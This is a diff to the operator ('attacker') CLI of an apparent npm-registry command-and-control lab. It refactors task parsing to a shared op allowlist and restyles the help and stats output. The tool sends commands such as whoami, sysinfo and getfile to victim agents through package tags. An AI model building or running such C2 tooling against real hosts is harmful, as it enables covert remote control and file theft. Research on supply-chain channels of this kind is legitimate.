@@ -8,8 +8,7 @@
 // Commands:
 //   agents                      list agents seen, with last-seen info
 //   task <agentId|all> <op> [args...]   publish a command tag
-//                         (ops: echo, sysinfo, ping, time, whoami,
-//                          getfile, pwd, cd, ls, stat, hash)
+//                         (op allowlist: src/common/ops.js)
 //   history [n]                 show the last n requests/responses (default 20)
 //   poll                        one-shot fetch & decode of new result tags
 //   clean                       delete all lab tags (x-cmd-*/x-res-*/x-ann-*)
@@ -25,7 +24,6 @@ import { loadConfig, configArgFromArgv } from '../common/config.js';
 import { createLogger } from '../common/logger.js';
 import {
   PINNED_VERSION,
-  TASK_OPS,
   MAX_TAG_LEN,
   decodeAnnounceTag,
   decodeResultTag,
@@ -35,16 +33,25 @@ import {
   isResultTag,
   reassembleResult,
 } from '../common/protocol.js';
+import { OP_DEFS, getOpDef } from '../common/ops.js';
 import { RegistryClient } from '../common/registry.js';
 import { saveState } from '../victim/agent.js';
 
 const tty = process.stdout.isTTY;
 const c = (color, s) => (tty ? styleText(color, s) : s);
 
+// Readability palette (no emojis, no rainbow):
+//   yellow bold  section headers        bold white   command/op names
+//   cyan         arguments & paths      dim          secondary text
+//   green        success / joins        red          errors
+//   magenta      agent ids / results    blue         prompt / outgoing
+const section = (s) => c(['bold', 'yellow'], s);
+const cmdName = (s) => c(['bold', 'white'], s);
+const arg = (s) => c('cyan', s);
+const dim = (s) => c('dim', s);
+
 const HISTORY_MAX = 200; // persisted entries, capped so the state file stays small
 const HISTORY_OUTPUT_MAX = 300; // chars of a result output kept in history
-const PATH_ARG_OPS = new Set(['getfile', 'cd', 'stat', 'hash']); // path required
-const OPS_WITH_ARGS = new Set([...PATH_ARG_OPS, 'ls', 'echo']); // ls path optional
 
 function ts() {
   return new Date().toTimeString().slice(0, 8);
@@ -97,24 +104,34 @@ function parseTaskLine(line) {
   if (!target || !op) {
     throw new Error('usage: task <agentId|all> <op> [args...]');
   }
-  if (!TASK_OPS.includes(op)) {
-    throw new Error(`unknown op "${op}" — allowed: ${TASK_OPS.join(', ')}`);
+  const def = getOpDef(op);
+  if (!def) {
+    throw new Error(`unknown op "${op}" — allowed: ${OP_DEFS.map((o) => o.name).join(', ')}`);
   }
-  if (!OPS_WITH_ARGS.has(op) && rest.length > 0) {
-    throw new Error(`op "${op}" takes no arguments`);
-  }
+  const pathHint =
+    '\n  path is absolute (e.g. /etc/hosts) or relative to the agent\'s cwd (see pwd/cd)';
   const args = {};
-  if (op === 'echo') args.text = rest.join(' ');
-  if (PATH_ARG_OPS.has(op) || op === 'ls') {
-    const p = rest.join(' ');
-    if (p) args.path = p;
-    if (PATH_ARG_OPS.has(op) && !args.path) {
-      throw new Error(
-        `usage: task <agentId|all> ${op} <path>\n` +
-          '  path is absolute (e.g. /etc/hosts) or relative to the agent\'s cwd ' +
-          '(see the pwd/cd ops)',
-      );
-    }
+  switch (def.argSpec) {
+    case 'none':
+      if (rest.length > 0) throw new Error(`op "${op}" takes no arguments`);
+      break;
+    case 'text':
+      args.text = rest.join(' ');
+      break;
+    case 'path':
+      args.path = rest.join(' ');
+      if (!args.path) throw new Error(`usage: task <agentId|all> ${def.usage}${pathHint}`);
+      break;
+    case 'path?':
+      if (rest.length > 0) args.path = rest.join(' ');
+      break;
+    case 'path+query':
+      [args.path] = rest;
+      args.query = rest.slice(1).join(' ');
+      if (!args.path || !args.query) {
+        throw new Error(`usage: task <agentId|all> ${def.usage}${pathHint}`);
+      }
+      break;
   }
   return { target, op, args };
 }
@@ -171,13 +188,13 @@ async function main() {
     logger,
   });
 
-  console.log(c('cyan', 'npm-c2-lab attacker CLI (educational research only)'));
-  console.log(`registry=${cfg.registryUrl} package=${cfg.packageName}`);
+  console.log(c(['bold', 'cyan'], 'npm-c2-lab attacker CLI (educational research only)'));
+  console.log(`${dim('registry:')} ${cfg.registryUrl}  ${dim('package:')} ${cfg.packageName}`);
   if (!cfg.token) {
     console.log(c('yellow', 'warning: NPM_C2_TOKEN is not set — writes will fail with 401'));
   }
-  console.log(`state=${statePath} (history: ${state.history.length} entries)`);
-  console.log('type "help" for commands');
+  console.log(`${dim('state:')}    ${statePath} ${dim(`(history: ${state.history.length} entries)`)}`);
+  console.log(`type ${cmdName('help')} for commands`);
 
   // --- REPL (created before the poller so notifications can redraw the prompt)
 
@@ -311,23 +328,44 @@ async function main() {
     }
   }
 
+  // --- help rendering -------------------------------------------------------
+
+  /** Render "left  description" rows with aligned columns. */
+  function table(rows, { indent = 2, pad = 4 } = {}) {
+    const width = Math.max(...rows.map(([left]) => left.length));
+    return rows
+      .map(
+        ([left, right]) =>
+          ' '.repeat(indent) + cmdName(left) + ' '.repeat(width - left.length + pad) + dim(right),
+      )
+      .join('\n');
+  }
+
   const commands = {
     help() {
+      const commandRows = [
+        ['task <agentId|all> <op> [args]', 'publish a command tag'],
+        ['agents', 'list agents seen (last-seen, host, cwd)'],
+        ['history [n]', 'last n requests/responses (default 20)'],
+        ['poll', 'fetch & decode new result tags once'],
+        ['clean', 'delete all x-cmd-* / x-res-* / x-ann-* tags'],
+        ['stats', 'local counters: sent, received, per-agent'],
+        ['help', 'this help'],
+        ['exit', 'save state and quit'],
+      ];
+      const opRows = OP_DEFS.map((o) => [o.usage, o.summary]);
       console.log(
         [
-          `${c('bold', 'agents')}                          list agents seen (last-seen, host, cwd)`,
-          `${c('bold', 'task')} <agentId|all> <op> [args]  send a task`,
-          `  ops without args:            echo <text>, sysinfo, ping, time, whoami, pwd`,
-          `  ops with a path:             getfile, cd, stat, hash  (absolute or cwd-relative)`,
-          `  ls [path]                    list a directory (default: agent cwd)`,
-          `${c('bold', 'history')} [n]                      last n requests/responses (default 20)`,
-          `${c('bold', 'poll')}                            fetch & decode new result tags once`,
-          `${c('bold', 'clean')}                           delete all x-cmd-*/x-res-*/x-ann-* tags`,
-          `${c('bold', 'stats')}                           show local counters`,
-          `${c('bold', 'help')}                            this help`,
-          `${c('bold', 'exit')}                            save state and quit`,
           '',
-          'live notifications (agent joined, task done/failed) print automatically',
+          section('  COMMANDS'),
+          table(commandRows),
+          '',
+          section(`  TASK OPS (${OP_DEFS.length})   ${dim('task <agentId|all> <op> [args]')}`),
+          table(opRows),
+          '',
+          dim('  path args are absolute or relative to the agent cwd (see pwd/cd).'),
+          dim('  agent joins and task results print as live notifications.'),
+          '',
         ].join('\n'),
       );
     },
@@ -339,7 +377,7 @@ async function main() {
         console.log(c('yellow', `registry refresh failed: ${err.message}`));
       }
       if (state.agents.length === 0) {
-        console.log('no agents seen yet');
+        console.log(dim('no agents seen yet'));
       } else {
         for (const a of state.agents) {
           const info = state.agentInfo[a] ?? {};
@@ -348,8 +386,9 @@ async function main() {
             .filter(Boolean)
             .join(' ');
           console.log(
-            `- ${c('green', a)} (${state.perAgent[a] ?? 0} results, last seen ${seen})${detail ? `\n    ${detail}` : ''}`,
+            `  ${c(['bold', 'green'], a)}  ${dim(`${state.perAgent[a] ?? 0} results, last seen ${seen}`)}`,
           );
+          if (detail) console.log(`    ${dim(detail)}`);
         }
       }
     },
@@ -376,18 +415,18 @@ async function main() {
     },
 
     history(line) {
-      const arg = line.trim().split(/\s+/)[1];
-      const n = arg ? Number(arg) : 20;
+      const argStr = line.trim().split(/\s+/)[1];
+      const n = argStr ? Number(argStr) : 20;
       if (!Number.isSafeInteger(n) || n <= 0) {
         console.log('usage: history [n]');
         return;
       }
       const entries = state.history.slice(-n);
       if (entries.length === 0) {
-        console.log('history is empty');
+        console.log(dim('history is empty'));
         return;
       }
-      console.log(`last ${entries.length} of ${state.history.length} entries:`);
+      console.log(dim(`last ${entries.length} of ${state.history.length} entries:`));
       for (const e of entries) console.log(formatHistoryEntry(e));
     },
 
@@ -412,14 +451,14 @@ async function main() {
     },
 
     stats() {
-      console.log(`commands sent:    ${state.sent}`);
-      console.log(`results received: ${state.received}`);
-      console.log(`agents seen:      ${state.agents.length}`);
+      console.log(`${dim('commands sent:')}    ${cmdName(String(state.sent))}`);
+      console.log(`${dim('results received:')} ${cmdName(String(state.received))}`);
+      console.log(`${dim('agents seen:')}      ${cmdName(String(state.agents.length))}`);
       for (const [a, n] of Object.entries(state.perAgent)) {
-        console.log(`  ${a}: ${n} results`);
+        console.log(`  ${c('magenta', a)}: ${n} results`);
       }
-      console.log(`history entries:  ${state.history.length}`);
-      console.log(`next seq:         ${JSON.stringify(state.nextSeq)}`);
+      console.log(`${dim('history entries:')}  ${state.history.length}`);
+      console.log(`${dim('next seq:')}         ${JSON.stringify(state.nextSeq)}`);
     },
   };
 
